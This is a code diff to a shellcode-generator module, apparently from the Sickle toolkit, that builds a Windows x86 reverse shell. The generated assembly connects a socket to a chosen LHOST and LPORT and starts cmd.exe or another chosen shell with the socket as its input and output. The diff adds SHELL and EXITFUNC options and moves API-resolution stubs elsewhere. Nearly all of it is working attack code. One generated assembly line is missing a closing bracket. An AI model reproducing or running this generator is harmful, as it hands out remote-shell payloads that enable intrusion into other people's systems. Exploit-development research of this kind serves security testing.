@@ -5,14 +5,12 @@ import struct
 from sickle.common.lib.generic import convert
 from sickle.common.lib.generic import modparser
 from sickle.common.lib.programmer import builder
+from sickle.common.lib.programmer import stubhub
 
 from sickle.common.lib.reversing.assembler import Assembler
 
 from sickle.common.headers.windows import (
-    winnt,
-    ntdef,
     ws2def,
-    winternl,
     winsock2,
     processthreadsapi,
 )
@@ -51,6 +49,20 @@ class Shellcode():
     arguments["LPORT"]["optional"] = "yes"
     arguments["LPORT"]["description"] = "Listening port on listener host"
 
+    arguments["SHELL"] = {}
+    arguments["SHELL"]["optional"] = "yes"
+    arguments["SHELL"]["description"] = "Shell environment (powershell.exe, cmd.exe, etc)"
+
+    advanced = {}
+    advanced["EXITFUNC"] = {}
+    advanced["EXITFUNC"]["optional"] = "yes"
+    advanced["EXITFUNC"]["description"] = "Exit technique"
+
+    advanced["EXITFUNC"]["options"] = { "terminate": "Terminates the process and all of its threads",
+                                        "func": "Have the shellcode operate as function",
+                                        "thread": "Exit as a thread",
+                                        "process": "Exit as a process" }
+
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
@@ -59,7 +71,6 @@ class Shellcode():
             "Kernel32.dll": [
                 "LoadLibraryA",
                 "CreateProcessA",
-                "TerminateProcess",
             ],
             "Ws2_32.dll": [
                 "WSAStartup",
@@ -68,12 +79,14 @@ class Shellcode():
             ]
         }
 
+        self.set_args()
+
         sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({ 
             "wsaData"                       : 0x00,
             "name"                          : ctypes.sizeof(ws2def.sockaddr),
             "lpStartupInfo"                 : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
-            "lpCommandLine"                 : len("cmd\x00"),
+            "lpCommandLine"                 : self.shell_env_len,
             "lpProcessInformation"          : 0x00,
         })
 
@@ -82,194 +95,63 @@ class Shellcode():
 
         return
 
-    def get_kernel32(self):
-        """Generates stub for obtaining the base address of Kernel32.dll
+    def set_args(self):
+        """Configure the arguments that may be used by the shellcode stub
         """
 
-        stub = f"""
-getKernel32:
-    mov dl, 0x4b
-getPEB:
-    xor ebx, ebx
-    xor ecx, ecx
-    mov bl, 0x30
-    mov edi, fs:[ebx]
-    mov edi, [edi + {winternl._PEB.Ldr.offset}]
-    mov edi, [edi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
-search:
-    mov eax, [edi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    mov esi, [edi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]    
-    mov edi, [edi]
-    cmp [esi + 0x18], cx
-    jne search
-    cmp [esi], dl
-    jne search
-found:
-        """
-
-        return stub
-
-    def lookup_function(self):
-        """Generates the stub responsible for obtaining the base address of a function
-        """
-
-        stub = f"""
-lookupFunction:
-    push ebp
-    mov ebp, esp
-    sub esp, 0x08
-    xor ebx, ebx
-    mov [ebp - 0x04], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
-    mov [ebp - 0x08], edx       ; Argv passed into lookupFunction
-    mov ebx, [edi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add ebx, {winnt._IMAGE_NT_HEADERS.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
-    add ebx, edi
-    mov eax, [ebx]
-    mov ebx, edi
-    add ebx, eax
-    mov eax, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
-    mov edx, edi
-    add edx, eax
-    mov ecx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
-    mov [ebp - 0x04], ebx       ; Backup EBX since we are going to XOR it
-parseNames:
-    jecxz error
-    dec ecx
-    mov eax, [edx + ecx * 4]
-    mov esi, edi
-    add esi, eax
-    xor eax, eax
-    xor ebx, ebx
-    cld
-calcHash:
-    lodsb
-    test al, al
-    jz calcDone
-    ror ebx, 0xD
-    add ebx, eax
-    jmp calcHash
-calcDone:
-    cmp ebx, [ebp - 0x08]
-    jnz parseNames
-findAddress:
-    mov ebx, [ebp - 0x04]       ; Restore EBX value prevously saved
-    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
-    add edx, edi
-    xor eax, eax
-    mov ax, [edx + ecx * 2]
-    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
-    add edx, edi
-    mov eax, [edx + eax * 4]
-    add eax, edi
-error:
-    leave
-    ret
-        """
-
-        return stub
-
-    def load_library(self, lib):
-        """Generates the stub to load a library not currently loaded into a process
-        """
-
-        lists = convert.from_str_to_xwords(lib, 0x04)
-        write_index = self.storage_offsets["functionName"]
-
-        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
-
-        for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
-            src += "    mov [ebp-{}], ecx\n".format(hex(write_index))
-            write_index -= 4
-
-        for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
-            src += "    mov [ebp-{}], cx\n".format(hex(write_index))
-            write_index -= 2
-
-        for i in range(len(lists["BYTE_LIST"])):
-            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
-            src += "    mov [ebp-{}], cl\n".format(hex(write_index))
-            write_index -= 1
-
-        src += f"""
-    xor ecx, ecx
-    mov [ebp - {write_index}], cl
-    lea ecx, [ebp - {self.storage_offsets['functionName']}]
-    push ecx
-    mov eax, [ebp - {self.storage_offsets['LoadLibraryA']}]
-    call eax
-        """
-
-        return src
-
-    def resolve_functions(self):
-        """This function is responsible for loading all libraries and resolving respective functions
-        """
-
-        stub = ""
-        for lib, imports in self.dependencies.items():
-            if (lib != "Kernel32.dll"):
-                stub += self.load_library(lib)
-                stub += """
-    mov edi, eax
-                """
-
-            for func in range(len(imports)):
-                stub += f"""
-get_{imports[func]}:
-    mov edx, {convert.from_str_to_win_hash(imports[func])}
-    call lookupFunction
-    mov [ebp - {self.storage_offsets[imports[func]]}], eax
-                """
-
-        return stub
-
-    def generate_source(self):
-        """Returns bytecode generated by the keystone engine.
-        """
-
-        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
+        all_args = Shellcode.arguments
+        all_args.update(Shellcode.advanced)
+        argv_dict = modparser.argument_check(all_args, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
-        if ("LPORT" not in argv_dict.keys()):
-            lport = 4444
+        # Set the shell environment that will be used by the shellcode. We must
+        # ensure to NULL terminate it.
+        if "SHELL" not in argv_dict.keys():
+            self.shell = "cmd.exe"
         else:
-            lport = int(argv_dict["LPORT"])
+            self.shell = argv_dict["SHELL"]
 
+        self.shell += "\x00"
+        while (len(self.shell) % 8) != 0:
+            self.shell += "\x00"
 
-        sin_addr = hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))
-        sin_port = struct.pack('<H', lport).hex()
+        # Document the size of the shell environment
+        self.shell_env_len = len(self.shell)
+
+        # Configure the options used by the host to obtain the callback
+        if ("LPORT" not in argv_dict.keys()):
+            self.lport = 4242
+        else:
+            self.lport = int(argv_dict["LPORT"])
+
+        self.lhost = argv_dict['LHOST']
+
+        # Set the EXITFUNC and update the necessary dependencies
+        if "EXITFUNC" not in argv_dict.keys():
+            self.exit_func = "terminate"
+        else:
+            self.exit_func = argv_dict["EXITFUNC"] 
+
+        if self.exit_func == "terminate":
+            self.dependencies["Kernel32.dll"] += "TerminateProcess",
+        elif self.exit_func == "thread":
+            self.dependencies["ntdll.dll"] = "RtlExitUserThread",
+        elif self.exit_func == "process":
+            self.dependencies["Kernel32.dll"] += "ExitProcess",
+
+        return 0
+
+    def gen_main(self):
+        """Returns assembly source code for the main functionality of the stub
+        """
+
+        # Setup the members of the sockaddr structure 
+        sin_addr = hex(convert.ip_str_to_inet_addr(self.lhost))
+        sin_port = struct.pack('<H', self.lport).hex()
         sin_family = struct.pack('>H', ws2def.AF_INET).hex()
 
-        shellcode = f"""
-_start:
-    push ebp
-    mov ebp, esp
-
-    ; Allocate the stack space with the use of AL of EAX in order to avoid a NULL byte
-    xor eax, eax
-    mov al, {self.stack_space}
-    sub esp, eax
-"""
-
-        shellcode += self.get_kernel32()
-
-        shellcode += """
-    jmp resolveFunctions
-"""
-
-        shellcode += self.lookup_function()
-
-        shellcode += """
-resolveFunctions:
-    mov edi, eax
-"""
-
-        shellcode += self.resolve_functions()
-
-        shellcode += f"""
+        src = f"""
 ; EAX => WSAStartup([in]  WORD      wVersionRequired,
 ;                   [out] LPWSADATA lpWSAData);
 call_WSAStartup:
@@ -304,22 +186,12 @@ call_WSASocketA:
     push ecx
     call eax
 
-    mov esi, eax ; Save the socket file descriptor (sockfd)
-"""
+    mov esi, eax ; Save the socket file descriptor (sockfd)\n"""
 
-        # Generate a value that will be XOR'd by 0xFFFFFFFF in order to get the
-        # original value for:
-        #
-        #   sin_port | sin_family
-        #   STARTF_USESTDHANDLES
-        #   "cmd"
-        #
-        # These values will then have to be XOR'd by 0xFFFFFFFF
-        xor_sockaddr = hex(int(f"{sin_port}{sin_family}", 16) ^ 0xFFFFFFFF)
-        xor_std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16) ^ 0xFFFFFFFF)
-        xor_cmd = hex(0x646d63 ^ 0xFFFFFFFF)
+        sockaddr = hex(int(f"{sin_port}{sin_family}", 16))
+        std_handles = hex(int(f"{processthreadsapi.STARTF_USESTDHANDLES}", 16))
 
-        shellcode += f"""
+        src += f"""
 ; EAX => connect([in] SOCKET s,
 ;                [in] const sockaddr *name,
 ;                [in] int namelen);
@@ -329,8 +201,7 @@ call_connect:
     push ecx
     mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {sin_addr}
 
-    mov eax, 0xffffffff
-    xor eax, {xor_sockaddr}
+    mov eax, {sockaddr}
 
     mov dword ptr [ebp - {self.storage_offsets['name']}], eax
     lea ecx, [ebp - {self.storage_offsets['name']}]
@@ -353,8 +224,7 @@ memsetStructBuffer:
 initMembers:
     mov al, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     mov [ebx], eax
-    mov eax, 0xffffffff
-    xor eax, {xor_std_handles}
+    mov eax, {std_handles}
     mov [ebx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
     mov [ebx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], esi
     mov [ebx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], esi
@@ -370,7 +240,28 @@ initMembers:
 ;                       [in, optional]      LPCSTR                lpCurrentDirectory,
 ;                       [in]                LPSTARTUPINFOA        lpStartupInfo,
 ;                       [out]               LPPROCESS_INFORMATION lpProcessInformation);
-call_CreateProccessA:
+call_CreateProccessA:\n"""
+
+        cmd_buffer = convert.from_str_to_xwords(self.shell, 0x04)
+        write_index = self.storage_offsets['lpCommandLine']
+
+        for i in range(len(cmd_buffer["DWORD_LIST"])):
+            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', cmd_buffer["DWORD_LIST"][i]).hex() )
+            src += "    mov [ebp-{}], ecx\n".format(hex(write_index))
+            write_index -= 4
+
+        for i in range(len(cmd_buffer["WORD_LIST"])):
+            src += "    mov cx, 0x{}\n".format( struct.pack('<H', cmd_buffer["WORD_LIST"][i]).hex() )
+            src += "    mov [ebp-{}], cx\n".format(hex(write_index))
+            write_index -= 2
+
+        for i in range(len(cmd_buffer["BYTE_LIST"])):
+            src += "    mov cl, {}\n".format( hex(cmd_buffer["BYTE_LIST"][i]) )
+            src += "    mov [ebp-{}], cl\n".format(hex(write_index))
+            write_index -= 1
+
+        src += f"""    xor ecx, ecx
+    mov [ebp - {write_index}, cl
     lea ecx, [ebp - {self.storage_offsets['lpProcessInformation']}]
     push ecx
     push ebx
@@ -384,34 +275,26 @@ call_CreateProccessA:
     push ecx
     push ecx
     lea ecx, [ebp - {self.storage_offsets['lpCommandLine']}]
-    mov eax, 0xffffffff
-    xor eax, {xor_cmd}
-    mov dword ptr [ecx], eax
     push ecx
     xor ecx, ecx
     push ecx
     mov eax, [ebp - {self.storage_offsets['CreateProcessA']}]
-    call eax
+    call eax\n"""
 
-; EAX => TerminateProcess([in] HANDLE hProcess,
-;                         [in] UINT   uExitCode);
-call_TerminateProcess:
-    xor ecx, ecx
-    push ecx
-    dec ecx
-    push ecx    
-    mov eax, [ebp - {self.storage_offsets['TerminateProcess']}]
-    call eax
-"""
-
-        return shellcode
+        return src
 
     def get_shellcode(self):
         """Generates Shellcode
         """
 
         generator = Assembler(Shellcode.arch)
+        win_stubs = stubhub.WinRawr(self.storage_offsets,
+                                    self.dependencies,
+                                    self.stack_space,
+                                    self.exit_func)
 
-        src = self.generate_source()
+        main_src = self.gen_main()
+        src = win_stubs.gen_source(main_src)
+        shellcode = generator.get_bytes_from_asm(src)
 
-        return generator.get_bytes_from_asm(src)
+        return shellcode
